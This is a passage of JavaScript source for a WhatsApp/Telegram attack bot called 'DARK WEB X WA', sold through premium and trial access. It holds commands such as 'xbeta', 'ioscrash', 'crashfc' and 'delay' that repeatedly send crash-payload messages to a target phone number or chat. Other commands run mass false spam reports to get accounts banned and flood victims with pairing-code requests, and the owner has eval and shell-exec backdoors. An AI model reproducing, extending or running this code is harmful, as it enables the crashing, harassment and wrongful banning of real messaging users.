    footer: global.botName,
    buttons: [
      {
        buttonId: "/ownermenu",
        buttonText: {
          displayText: "𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮"
        }
      },
      {
        buttonId: "/banmenu",
        buttonText: {
          displayText: "𝘽𝙖𝙣𝙢𝙚𝙣𝙪"
        }
      },
      {
        buttonId: "/bugmenu",
        buttonText: {
          displayText: "𝘽𝘼𝘾𝙆 𝙏𝙊 𝘽𝙐𝙂𝙈𝙀𝙉𝙐"
        }
      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: mess,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `120363290640941556@newsletter`, // Use the newsletterJid here
        newsletterName: `𝙎𝘾𝙍𝙄𝙋𝙏 𝙆𝙄𝘿𝘿𝙄𝙀𝙎 𝙏𝙀𝘾𝙃` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await conn.sendMessage(chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: mess })
}
break
case 'banmenu':{
const caption = `
>      𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰 
> 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝚇
> 𝐌𝐨𝐝𝐞 : 𝑷𝒖𝒃𝒍𝒊𝒄
> 𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.creatorName}
> 𝐎𝐰𝐧𝐞𝐫 : ${global.owner}
> 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : ${runtime(process.uptime())}

💥 *BAN COMMANDS* 💥
🔹 *${prefix}xban* - mass report 
🔹 *${prefix}spamreport* - mass report`;

  conn.sendMessage(chat, {
    image: { url: "https://files.catbox.moe/4wzyc7.jpeg" },
    caption,
    mentions: [mess.sender],
    footer: global.botName,
    buttons: [
      {
        buttonId: "/bugmenu",
        buttonText: {
          displayText: "𝐁𝐮𝐠𝐦𝐞𝐧𝐮"
        }
      },
      {
        buttonId: "/ownermenu",
        buttonText: {
          displayText: "𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮"
        }
      },
      {
        buttonId: "/banmenu",
        buttonText: {
          displayText: "𝘽𝙖𝙣𝙢𝙚𝙣𝙪"
        }
      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: mess,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `120363290640941556@newsletter`, // Use the newsletterJid here
        newsletterName: `𝙎𝘾𝙍𝙄𝙋𝙏 𝙆𝙄𝘿𝘿𝙄𝙀𝙎 𝙏𝙀𝘾𝙃` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await conn.sendMessage(chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: mess })
}
    break
 case 'xbeta': 
 
     
 
   if (!q) return send(`Syntax Error\nUsage: ${prefix + command} 234x`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
send(` Lock Target: ${target}
Requested Bug: xbeta 𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰🩸
© 𝙼𝙰𝙻𝙸𝙱𝚄
 `)
     for (let i = 0; i < 20; i++) {
    await listxPay(target)
    await sxPay(target)
    await thunderblast_ios1(target)
    await forclose(target)
    await Bug5(target)
     }
send(` Successfully Sent Bugs To ${target}
Bug Type: xbeta
 `)
break
 case 'crashfc': {
 
     

send("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
     for (let i = 0; i < 20; i++) {
    await thunderblast_ios1(chat)
    await listxPay(chat)
    await sxPay(chat)
    await forclose(chat)
    await Bug5(chat)
     }
send(` Successfully Sent Bugs To Target 🐛 Type: betai
 `)
}
break
 case 'delay': {
 
     

send("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
     for (let i = 0; i < 100; i++) {
    await outofsync(chat)
    await outofsync(chat)
    await outofsync(chat)
     }
send(` Successfully Sent Bugs To Target 🐛 Type: delay
 `)
}
break
 case 'betanew': {
 
     

send("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
     for (let i = 0; i < 50; i++) {
    await thunderblast_ios1(chat)
    await listxPay(chat)
    await sxPay(chat)
    await forclose(chat)
    await Bug5(chat)
     }
send(` Successfully Sent Bugs To Target 🐛 Type: betanew
 `)
}
break
 case 'toyanew': {
 
     

send("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
     for (let i = 0; i < 5; i++) {
    await outofsync(chat)
    await INFINITY_NOCLICKTOYA1(chat)
    await INFINITY_NOCLICKTOYA2(chat)
    await INFINITY_NOCLICKTOYA3(chat)
    await INFINITY_NOCLICKTOYA4(chat)
    await newLoaudFast(chat)
    await newLoadFast(chat)
    await outofsync(chat)
    await outofsync(chat)
     }
send(` Successfully Sent Bugs To Target 🐛 Type: betanew
 `)
}
break

case 'xgroup': {

 
send("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 30; i++) {
await Bug5(chat);
await Bug5(chat);
await Bug5(chat); 
await Bug5(chat);
await Bug5(chat);
await Bug5(chat);
}
send(`
𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰🩸
👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
   `)
}
break
case 'ioscrash': {

 
if (!q) return send(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
send("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
    await thunderblast_ios1(target)
    await listxPay(target)
    await sxPay(target)
    await thunderblast_ios1(target)
    await forclose(target)
}
send("TARGET CRASHED")
}
    break;
    
    case "spamreport": {
        if (!args[0]) return send("❌ Please provide a target number to report");
        
        let targetNumber = args[0];
        // Clean up the number format
        targetNumber = targetNumber.replace(/[^0-9]/g, '');
        
        if (!targetNumber.endsWith('@s.whatsapp.net')) {
            targetNumber = targetNumber + '@s.whatsapp.net';
        }
        
        send(`🚨 Starting spam report on ${targetNumber.split('@')[0]}...`);
        const result = await spamReport(conn, targetNumber, null);
        send(result);
    }
    break;
    
    case "sendmsg": {
        if (args.length < 2) return send("❌ Please provide a target number and message");
        
        let targetNumber = args[0];
        // Clean up the number format
        targetNumber = targetNumber.replace(/[^0-9]/g, '');
        
        if (!targetNumber.endsWith('@s.whatsapp.net')) {
            targetNumber = targetNumber + '@s.whatsapp.net';
        }
        
        const message = args.slice(1).join(' ');
        try {
            await conn.sendMessage(targetNumber, { text: message });
            send(`✅ Message sent to ${targetNumber.split('@')[0]}`);
        } catch (error) {
            send(`❌ Failed to send message: ${error.message}`);
        }
    }
    break;
    
    case "block": {
        if (!args[0]) return send("❌ Please provide a target number to block");
        
        let targetNumber = args[0];
        // Clean up the number format
        targetNumber = targetNumber.replace(/[^0-9]/g, '');
        
        if (!targetNumber.endsWith('@s.whatsapp.net')) {
            targetNumber = targetNumber + '@s.whatsapp.net';
        }
        
        try {
            await conn.updateBlockStatus(targetNumber, "block");
            send(`✅ Blocked ${targetNumber.split('@')[0]}`);
        } catch (error) {
            send(`❌ Failed to block: ${error.message}`);
        }
    }
    break;
    
    case "unblock": {
        if (!args[0]) return send("❌ Please provide a target number to unblock");
        
        let targetNumber = args[0];
        // Clean up the number format
        targetNumber = targetNumber.replace(/[^0-9]/g, '');
        
        if (!targetNumber.endsWith('@s.whatsapp.net')) {
            targetNumber = targetNumber + '@s.whatsapp.net';
        }
        
        try {
            await conn.updateBlockStatus(targetNumber, "unblock");
            send(`✅ Unblocked ${targetNumber.split('@')[0]}`);
        } catch (error) {
            send(`❌ Failed to unblock: ${error.message}`);
        }
    }
    break
case 'spampair': {
			if (!q) return send(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 2348140825959`)
			let [peenis, pepekk = "200"] = q.split("|")
			
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys')
			let {
				state
			} = await useMultiFileAuthState('WhatsAppOtp')
			let {
				version
			} = await fetchLatestBaileysVersion()
	 send(`Success!`)
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`Success Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(15000)
		} 
    break;

    default:
        if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return send(bang)
}
try {                                                                             
send(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
send(String(e))
}
	} 
		if (budy.startsWith('>')) {
        if (!isCreator) return
        try {
        let evaled = await eval(budy.slice(2))
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
        await send(evaled)
        } catch (err) {
        await send(String(err))
        }
	} 
	        
	if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return send(`${err}`)
if (stdout) return send(`${stdout}`)
})
} 
        }
	     } catch (error) { console.log(error)}
        } catch (err) {
            console.log(err)
        }
    })
}

// Handle /connect command
bot.onText(/\/connect (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const phoneNumber = match[1];
     
     // Check if the user has access
    if (!hasAccess(userId) && !isAdmin(msg.from.username) && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, '🔒 This command is only available for premium members or users on trial.\nUse /addtrial to start a 1-day trial.');
    }
    // Check if the number is allowed
    const sessionPath = path.join(__dirname, 'SESSIONS', `session_${phoneNumber}`);

    // Check if the session directory exists
    if (!fs.existsSync(sessionPath)) {
        // If the session does not exist, create the directory
        fs.mkdirSync(sessionPath, { recursive: true });
        console.log(`Session directory created for ${phoneNumber}.`);
        bot.sendMessage(chatId, `Session directory created for ${phoneNumber}.`);

        // Generate and send pairing code
        startWhatsAppBot(phoneNumber, chatId).catch(err => {
            console.log('Error:', err);
            bot.sendMessage(chatId, 'An error occurred while connecting.');
        });
    } else {
        // If the session already exists, check if the user is already connected
        const isAlreadyConnected = connectedUsers[chatId] && connectedUsers[chatId].some(user => user.phoneNumber === phoneNumber);
        if (isAlreadyConnected) {
            bot.sendMessage(chatId, `The phone number ${phoneNumber} is already connected. Please use /delpair to remove it before connecting again.`);
            return;
        }

        // Proceed with the connection if the session exists
        bot.sendMessage(chatId, `The session for ${phoneNumber} already exists. You can use /delpair to remove it or connect again.`);
    }
});

bot.onText(/\/uptime/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Uptime is ${formatTime(process.uptime())}`);
});


// Handle telegram spam report command
bot.onText(/\/spamreport (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    let targetNumber = match[1].trim();
    
    // Clean up the number format
    targetNumber = targetNumber.replace(/[^0-9]/g, '');
    
    // Find the user's WhatsApp connection
    const userConnections = connectedUsers[chatId];
    if (!userConnections || userConnections.length === 0) {
        return bot.sendMessage(chatId, "⚠️ You don't have any active WhatsApp connections. Please connect first.");
    }
    
    // Use the first connection
    const phoneNumber = userConnections[0].phoneNumber;
    const sessionPath = path.join(__dirname, 'SESSIONS', `session_${phoneNumber}`);
    
    if (!fs.existsSync(sessionPath)) {
        return bot.sendMessage(chatId, "❌ Your WhatsApp session is not valid. Please reconnect.");
    }
    
    // Start the session if not already running
    let { state } = await useMultiFileAuthState(sessionPath);
    const msgRetryCounterCache = new NodeCache();
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.windows('Firefox'),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        msgRetryCounterCache
    });
    
    bot.sendMessage(chatId, `🚨 Starting spam report on ${targetNumber}...`);
    
    // Format number for WhatsApp
    if (!targetNumber.endsWith('@s.whatsapp.net')) {
        targetNumber = targetNumber + '@s.whatsapp.net';
    }
    
    // Start the spam report process
    const result = await spamReport(conn, targetNumber, chatId);
    bot.sendMessage(chatId, result);
});

// Handle /delete command
bot.onText(/\/delpair (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const ownerId = msg.from.id.toString();
    const phoneNumber = match[1];
    const sessionPath = path.join(__dirname, 'SESSIONS', `session_${phoneNumber}`);
    // Check if the user has access
    if (!hasAccess(userId) && !isAdmin(msg.from.username) && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, '🔒 This command is only available for premium members or users on trial.\nUse /addtrial to start a 1-day trial.');
    }
    // Check if the session directory exists
    if (fs.existsSync(sessionPath)) {
           fs.rmSync(sessionPath, { recursive: true, force: true });
            bot.sendMessage(chatId, `Session for ${phoneNumber} has been deleted. You can now request a new pairing code.`);
            connectedUsers[chatId] = connectedUsers[chatId].filter(user => user.phoneNumber !== phoneNumber); // Remove the association after deletion
            saveConnectedUsers(); // Save updated connected users
    } else {
        bot.sendMessage(chatId, `No session found for ${phoneNumber}. It may have already been deleted.`);
    }
});


// Command to list all paired devices (simplified version)
bot.onText(/\/listpair/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    
    // Check if the user has access
    if (!hasAccess(userId) && !isAdmin(msg.from.username) && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, '🔒 This command is only available for premium members or users on trial.\nUse /addtrial to start a 1-day trial.');
    }
    
    // Get all connected users for this chat
    const userPairs = connectedUsers[chatId] || [];
    
    if (userPairs.length === 0) {
        return bot.sendMessage(chatId, '📱 You have no paired WhatsApp devices.');
    }
    
    // Simply list the phone numbers
    const phoneNumbers = userPairs.map((user, index) => {
        return `${index + 1}. ${user.phoneNumber}`;
    }).join('\n');
    
    return bot.sendMessage(chatId, `📋 *Your Paired WhatsApp Devices:*\n\n${phoneNumbers}\n\nUse /delpair <number> to remove a device.`, { parse_mode: 'Markdown' });
});

// Handle /menu command
bot.onText(/\/menu/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendPhoto(chatId, "https://files.catbox.moe/4wzyc7.jpeg", {
        caption: `
════════════════════  
𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰 
𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝚇
════════════════════  

🔹 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥: @𝙼𝙰𝙻𝙸𝙱𝚄

  𝙲𝙾𝙽𝙽𝙽𝙴𝙲𝚃 𝚃𝙾 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿
 /connect <254xxxx> 
 /delpair <254xxx> 
 /listpair - View paired devices
 /uptime
 /backup 
 /addprem 
 /delprem 
 /listprem
 /addtrial - Get 1-day trial
 /canceltrial - Cancel trial

════════════════════
`,
        reply_markup: {
            inline_keyboard: [
                [{
                    text: ' Channel',
                    url: 't.me/techpalace',
                }],
                [{
                    text: 'Owner',
                    url: 'https://t.me/Oman0121',
                }],
                [{
                    text: 'Github',
                    url: 'https://github.com/blackarab',
                }],
            ],
        }
    });
});

// Using node-telegram-bot-api style
bot.onText(/^\/backup($|@\w+$)/, async (msg) => {
    const allowedUsers = ['malibu', 'Oman0121']; // Allowed usernames
    const chatId = msg.chat.id;
    const username = msg.from.username;

    if (!allowedUsers.includes(username)) {
        return bot.sendMessage(chatId, '❌ Only the owners can use this command.');
    }
  
    // Get mentioned user or sender
    let jir = msg.reply_to_message?.from.id || msg.from.id;

    // Send reply
    await bot.sendMessage(chatId, 'Gathering all files to folder...');

    try {
        // Import required modules
        const { execSync } = require('child_process');
        const fs = require('fs');

        // Get list of files to backup
        const ls = execSync('ls').toString().split('\n').filter((pe) =>
            pe !== 'node_modules' &&
            pe !== 'session' &&
            pe !== 'package-lock.json' &&
            pe !== 'yarn.lock' &&
            pe !== ''
        );

        // Send reply
        await bot.sendMessage(chatId, 'Script will be sent via PC!');

        // Create backup zip
        execSync(`zip -r Mass report by kingbadboi.zip ${ls.join(' ')}`);

        // Send backup zip
        await bot.sendDocument(chatId, './Mass report by kingbadboi.zip', {
            caption: 'Backup completed'
        });
        
        // Delete the zip file after sending
        fs.unlinkSync('./Mass report by dark web x.zip');
        
        await bot.sendMessage(chatId, '✅ Backup completed successfully!');
    } catch (error) {
        console.error('Backup error:', error);
        await bot.sendMessage(chatId, `❌ Error during backup: ${error.message}`);
    }
});
// Command to add premium user (admin only)
bot.onText(/\/addprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const username = msg.from.username;
    
    if (!isAdmin(username)) {
        return bot.sendMessage(chatId, '🚫 Sorry, only the admin can use this command.');
    }
    
    const userIdentifier = match[1];
    // If it's a number, treat as ID, otherwise as username
    const userId = /^\d+$/.test(userIdentifier) ? userIdentifier : `@${userIdentifier.replace('@', '')}`;
    
    const premiumUsers = loadPremiumUsers();
    
    // Check if user is already premium
    if (premiumUsers.some(user => user.id === userId)) {
        return bot.sendMessage(chatId, '⚠️ This user is already a premium member.');
    }
    
    // Add user to premium
    premiumUsers.push({
        id: userId,
        addedAt: new Date().toISOString(),
        addedBy: username
    });
    
    savePremiumUsers(premiumUsers);
    
    // Remove user from trial if they were on trial
    const trialUsers = loadTrialUsers();
    const updatedTrialUsers = trialUsers.filter(user => user.id !== userId);
    saveTrialUsers(updatedTrialUsers);
    
    return bot.sendMessage(chatId, `✅ User ${userId} has been added as a premium member.`);
});

// Command to delete premium user (admin only)
bot.onText(/\/delprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const username = msg.from.username;
    
    if (!isAdmin(username)) {
        return bot.sendMessage(chatId, '🚫 Sorry, only the admin can use this command.');
    }
    
    const userIdentifier = match[1];
    // If it's a number, treat as ID, otherwise as username
